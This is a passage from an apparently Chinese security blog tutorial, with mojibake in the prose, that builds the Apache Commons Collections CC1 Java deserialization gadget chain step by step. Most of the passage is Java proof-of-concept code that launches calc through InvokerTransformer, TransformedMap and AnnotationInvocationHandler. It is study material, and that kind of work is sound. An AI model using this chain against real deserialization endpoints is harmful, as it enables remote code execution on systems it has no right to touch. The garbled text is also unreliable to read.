class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> runtime.getClass();  <span class="comment">//è·å–Classå®ä¾‹å¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">cMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  <span class="comment">//åˆ©ç”¨åå°„è·å–Runtimeçš„execæ–¹æ³•  </span></span><br><span class="line">  </span><br><span class="line">        cMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  <span class="comment">//åœ¨runtimeå®ä¾‹ä¸Šè°ƒç”¨execæ–¹æ³•å¹¶ä¼ å…¥calcå‚æ•°  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåå°„è°ƒç”¨execæ–¹æ³•ä¸ºï¼Œå…ˆå¾—åˆ°Runtimeç±»çš„å¯¹è±¡runtimeï¼Œå†å¾—åˆ°ç±»ä¸­æ‰€æœ‰æ–¹æ³•çš„å¯¹è±¡cï¼Œ<br>ç„¶åå¾—åˆ°execæ–¹æ³•å¹¶èµ‹å€¼ç»™cMethodï¼Œç„¶åä½¿ç”¨Methodç±»çš„invokeæ–¹æ³•æ‰§è¡ŒRuntimeç±»ä¸­çš„execæ–¹æ³•å¹¶ä¼ å…¥å‚æ•°calcï¼Œä¹Ÿæœ‰ä¸€ç§é“¾å­çš„æ„Ÿè§‰<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145805.png" alt="image-20230426214518703"><br>ç„¶åæ”¹å†™ä¸ºInvokerTransformerç±»ä¸­çš„transformæ–¹æ³•æ¥å¼¹ï¼Œç”±äºtransformæ–¹æ³•ä¸ºpublicæ‰€ä»¥æ— éœ€åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        invokerTransformer.transform(runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¥ä¸ºä»€ä¹ˆè¦é‚£æ ·æ„é€ è·Ÿè¿›ç±»å’Œæ–¹æ³•çœ‹ä¸€ä¸‹å°±èƒ½ç†è§£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145403.png" alt="image-20230426214543314"><br>ç„¶åæ ¹æ®æœ€åä¸€å¥<code>invokerTransformer.transform(runtime);</code>å»å¯»æ‰¾ä¸åŒåå‡½æ•°ï¼Œè¿™é‡Œæˆ‘å‡ºäº†ä¸€ä¸ªé—®é¢˜å°±æ˜¯æˆ‘å…¨å±€æœç´¢ä¸åˆ°transformæ–¹æ³•çš„å¼•ç”¨ï¼ŒåŸå› æ˜¯åœ¨mavenä¸­æ²¡æœ‰ä¸‹è½½jaråŒ…çš„æºç ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæœä¸åˆ°ï¼Œå‚è€ƒ<a href="https://blog.csdn.net/qq_26012495/article/details/109694133">è§£å†³</a>ï¼Œç„¶åfind usageså°±èƒ½æ‰¾åˆ°è¿™ä¸ªæ–¹æ³•çš„å¼•ç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262145831.png" alt="image-20230426214555687"><br>æœ€ç»ˆæ‰¾åˆ°TransformedMapç±»çš„checkSetValueæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262146939.png" alt="image-20230426214602802"><br>è·Ÿè¿›ä¸€ä¸‹valueTransformeræ–¹æ³•ï¼Œçœ‹åˆ°å®ƒçš„æ„é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span>  </span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>  </span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer     valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>(map);  </span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;  </span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªä¿æŠ¤ç±»å‹å˜é‡é€šè¿‡æ„é€ å‡½æ•°èµ‹å€¼ï¼Œç»§ç»­å¾€ä¸‹çœ‹æ‰¾åˆ°ä¸€ä¸ªpublicæ–¹æ³•è¿”å›äº†æ„é€ å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;  </span><br><span class="line">    <span class="type">TransformedMap</span> <span class="variable">decorated</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);  </span><br><span class="line">    <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformed</span> <span class="operator">=</span> decorated.transformMap(map);  </span><br><span class="line">        decorated.clear();  </span><br><span class="line">        decorated.getMap().putAll(transformed);  <span class="comment">// avoids double transformation  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> decorated;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†å›å¿†ä¸€ä¸‹æˆ‘ä»¬ä¸€å¼€å§‹çš„å°¾éƒ¨<code>invokerTransformer.transform(runtime);</code>æ‰€ä»¥è¿™é‡Œè®©valueTransformerä¸ºinvokerTransformeræ˜¯ä¸æ˜¯å°±å¯ä»¥å¼¹è®¡ç®—å™¨äº†ï¼Œä½†æ˜¯ç”±äºvalueTransformeræ˜¯protectedå‹æ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨åå°„æ¥è·å¾—ï¼Œå¼€å§‹æ„é€ poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">        <span class="comment">//å¾—åˆ°ä¸€ä¸ªæ–°çš„TransformedMapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line">        <span class="comment">//è·å¾—TransformedMapç±»çš„å¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">  </span><br><span class="line">        checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        checkSetValueMethod.invoke(decorateMap,runtime);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147170.png" alt="image-20230426214628370"><br>ç„¶åè¿™é‡Œ<code>.decorate</code>æ— æ³•å†ç»§ç»­å¾€å‰äº†ï¼Œæ‰€ä»¥å¾—é‡æ–°æ‰¾ä¸€æ¡ï¼Œè¿˜æ˜¯find usagesï¼Œä¸è¿‡è¿™æ¬¡æ˜¯æ‰¾checkSetValueçš„ç´¢å¼•ï¼Œç„¶åæ‰¾åˆ°äº†AbstractInputCheckedMapDecoratorç±»å³TransformedMapçš„çˆ¶ç±»<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262147042.png" alt="image-20230426214744010"><br>é‡Œé¢çš„setValueæ–¹æ³•è°ƒç”¨äº†checkSetValueæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;  </span><br><span class="line">    value = parent.checkSetValue(value);  </span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè°ƒç”¨äº†setValueçš„ç±»æ˜¯AbstractInputCheckedMapDecoratorçš„å†…éƒ¨ç±»MapEntry<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148400.png" alt="image-20230426214800338"><br>setValueæ–¹æ³•å°±æ˜¯å¯¹é”®å€¼å¯¹ä¸­çš„å€¼èµ‹å€¼çš„æ“ä½œï¼Œè·Ÿè¿›å»å³å¯çœ‹åˆ°<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148781.png" alt="image-20230426214809746"><br>ç„¶åç»§ç»­å¯¹setValueæŸ¥æ‰¾ç´¢å¼•find usagesï¼Œå¦‚æœæ˜¯readObjectç”¨äº†è¿™ä¸ªæ–¹æ³•é‚£ä¹ˆå°±æ‰¾åˆ°äº†å…¥å£<br>åœ¨è¿™é‡Œæ‰¾åˆ°å…¥å£ç±»AnnotationInvocationHandleré‡Œé¢çš„readObjectæ–¹æ³•è°ƒç”¨äº†setValueæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148807.png" alt="image-20230426214825669"><br>ä½†æ˜¯è¦è°ƒç”¨setValueæ–¹æ³•é¦–å…ˆå¾—æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸¤ä¸ªifï¼ŒmemberTypeä¸èƒ½ä¸ºç©ºï¼Œç¬¬äºŒä¸ªifé¦–å…ˆåˆ¤æ–­å˜é‡â€valueâ€æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹â€memberTypeâ€çš„å®ä¾‹ï¼Œè¿™é‡Œä½¿ç”¨äº†Javaä¸­çš„isInstanceæ–¹æ³•ã€‚å¦‚æœâ€valueâ€æ˜¯æŒ‡å®šç±»å‹çš„å®ä¾‹ï¼Œåˆ™æ¡ä»¶è¡¨è¾¾å¼çš„å€¼ä¸ºtrueï¼Œæ•´ä¸ªæ¡ä»¶è¯­å¥çš„æ‰§è¡Œç»“æœä¸ºfalseã€‚å¦‚æœâ€valueâ€ä¸æ˜¯æŒ‡å®šç±»å‹çš„å®ä¾‹ï¼Œæ¥ä¸‹æ¥å†åˆ¤æ–­â€valueâ€æ˜¯å¦æ˜¯ExceptionProxyç±»çš„å®ä¾‹ã€‚å¦‚æœâ€valueâ€æ˜¯ExceptionProxyç±»çš„å®ä¾‹ï¼Œåˆ™æ¡ä»¶è¡¨è¾¾å¼çš„å€¼ä¸ºtrueï¼Œæ•´ä¸ªæ¡ä»¶è¯­å¥çš„æ‰§è¡Œç»“æœä¸ºfalseã€‚<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262148500.png" alt="image-20230426214837403"><br>æ¥ä¸‹æ¥æ„é€ exp</p><h2 id="TransformedMap-ç‰ˆCC1-EXP"><a href="#TransformedMap-ç‰ˆCC1-EXP" class="headerlink" title="TransformedMap ç‰ˆCC1 EXP"></a>TransformedMap ç‰ˆCC1 EXP</h2><p>ä¸‹é¢æ˜¯ç†æƒ³æƒ…å†µä¸‹çš„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime(); <span class="comment">//è·å–Runtimeå®ä¾‹  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//è¿™é‡Œåˆ›å»ºä¸€ä¸ªhashmapå¯¹è±¡æ˜¯å› ä¸ºdecorateTransformæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºmapå¯¹è±¡  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–ä¸ååºåˆ—åŒ–  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªpayloadè¿˜æœ‰ä¸‰ä¸ªé—®é¢˜æ²¡è§£å†³æ‰€ä»¥æ³¨å®šä¼šå¤±è´¥</p><blockquote><ol><li>Runtimeå¯¹è±¡ä¸èƒ½è¢«åºåˆ—åŒ–</li><li>setValueä¼ å…¥çš„å¯¹è±¡åº”è¯¥æ˜¯Runtimeå¯¹è±¡çš„ï¼Œè€Œåœ¨å®é™…æƒ…å†µä¸­ç¡®æ˜¯AnnotationTypeMismatchExceptionProxy<br>3.é€šè¿‡ä¸¤ä¸ªifåˆ¤æ–­</li></ol></blockquote><h3 id="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"><a href="#è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–" class="headerlink" title="è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–"></a>è§£å†³Runtimeä¸èƒ½åºåˆ—åŒ–</h3><p>Runtimeä¸èƒ½åºåˆ—åŒ–å› ä¸ºè¿™ä¸ªç±»æ²¡æœ‰Serializableæ¥å£ï¼Œä½†æ˜¯Runtime.classå¯ä»¥ï¼Œå…ˆå†™ä¸€ä¸ªæ™®é€šçš„åå°„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtimeClass</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line">        <span class="comment">//å°†runtimeå¼ºåˆ¶è½¬æ¢ä¸ºRuntimeå¯¹è±¡  </span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntime.invoke(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">        <span class="comment">//è·å–execæ–¹æ³•  </span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line">        method.invoke(runtime,<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†<code>Runtime</code>æ”¹ä¸º<code>InvokerTransformer</code> è°ƒç”¨çš„æ–¹å¼ï¼Œè¿™é‡Œä¸ºäº†é¿å…å†—ä½™ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ChainedTransformerç±»å»å¥—ï¼ŒChainedTransformerç±»å®ç°äº†Transformeré“¾å¼è°ƒç”¨ï¼Œæˆ‘ä»¬åªéœ€è¦ä¼ å…¥ä¸€ä¸ªTransformeræ•°ç»„ChainedTransformerå°±å¯ä»¥å®ç°ä¾æ¬¡çš„å»è°ƒç”¨æ¯ä¸€ä¸ªTransformerçš„transformæ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æŠŠå®ƒä¸ <code>decorate</code> çš„é“¾å­ç»“åˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//ç”¨äºè§£å†³ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½è¢«åºåˆ—åŒ–  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title 